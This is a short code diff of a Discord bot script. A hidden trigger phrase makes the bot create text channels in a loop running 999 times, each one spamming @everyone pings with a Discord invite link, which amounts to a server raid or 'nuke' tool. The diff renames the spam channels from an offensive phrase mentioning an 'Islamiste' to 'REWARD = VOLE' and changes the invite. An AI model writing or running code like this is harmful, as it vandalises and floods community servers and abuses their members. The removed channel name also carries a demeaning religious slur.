@@ -164,12 +164,12 @@ if(message.content.includes("ar!kelsairvvesrx")){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
+                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("!everyone ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
 
                       }
                     }
